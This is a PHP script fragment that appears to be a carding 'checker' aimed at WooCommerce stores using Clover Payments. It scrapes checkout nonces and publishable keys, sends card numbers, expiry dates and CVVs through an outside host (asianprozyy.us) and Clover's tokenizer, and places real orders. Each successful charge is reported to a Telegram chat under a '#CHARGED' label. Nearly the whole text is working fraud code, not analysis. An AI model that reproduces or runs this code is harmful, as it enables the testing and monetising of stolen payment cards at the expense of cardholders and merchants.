...
curl_close($ch);
htmlentities($Checkout);

if (preg_match('/"publishableKey":"([a-zA-Z0-9]+)"/', $Checkout, $matches)) {
    $publishableKey = $matches[1];
    "Publishable Key: " . $publishableKey;
}
preg_match('/<script[^>]*id="custom_scripts-js-extra"[^>]*src="data:text\/javascript;base64,([^"]+)"[^>]*><\/script>/i', $Checkout, $matches);
if (!empty($matches)) {
    $base64Content = $matches[1]; 
    $decodedContent = base64_decode($base64Content);
    preg_match('/"publishableKey"\s*:\s*"([^"]+)"/', $decodedContent, $keyMatch);

    if (!empty($keyMatch[1])) {
        $publishableKey = $keyMatch[1];
         "Publishable Key: " . htmlentities($publishableKey);
    }
}
...
if(curl_errno($ch)) {
    ...
    function extractTokenValue($html, $inputId) {
        $pattern = '/id="' . preg_quote($inputId, '/') . '"[^>]*value="([^"]*)"/';
        preg_match($pattern, $html, $matches);
        return isset($matches[1]) ? $matches[1] : '';
    }

    $nonce = extractTokenValue($Checkout, 'woocommerce-process-checkout-nonce');
    $cloverTokenNonce = extractTokenValue($Checkout, 'cloverTokenNonce');
    "Woocommerce Checkout Nonce: " . $nonce . "\n";
    "Clover Token Nonce: " . $cloverTokenNonce . "\n";
}
...
$options = [
    CURLOPT_URL => 'https://asianprozyy.us/encrypt/clover',
...
$cc = json_decode($result)->data;
$encryptedCard = json_decode($result)->encryptedCard;
$createdBy = json_decode($result)->createdBy;

curl_close($curl);
# ------------------ [ CLOVER TOKEN ] ------------- #

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://token.clover.com/v1/tokens');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
   'Host: token.clover.com',
   'User-Agent: '.$ua.'',
   'Content-Type: application/json',
...
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"card":{"encrypted_pan":"'.$encryptedCard.'","exp_month":"'.$mes.'","exp_year":"'.$ano.'","cvv":"'.$cvv.'","first6":"'.$cc6.'","last4":"'.$cc4.'","brand":"'.$brand.'","address_zip":"'.$zip.'"}}');
...
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(array(
    ...
    'PostVar' => '',
    'clover_token' => $id,
    'clover_token_nonce' => $cloverTokenNonce,
...
if (strpos($Payment, '"result":"success","redirect"') !== false && strpos($Payment, 'order-received') !== false) { 
    ...
    $telegramMessage = "[#CHARGED]- $lista [CLOVERPAYMENTS CVV CHARGED]
    \n[$hostname1]
    \n[$receiptUrl]\n";
    sendToTelegram($telegramMessage, $telegramToken, $chatId);
    
$log_entry = "*GATEWAY : CLOVER PAYMENTS*\n";
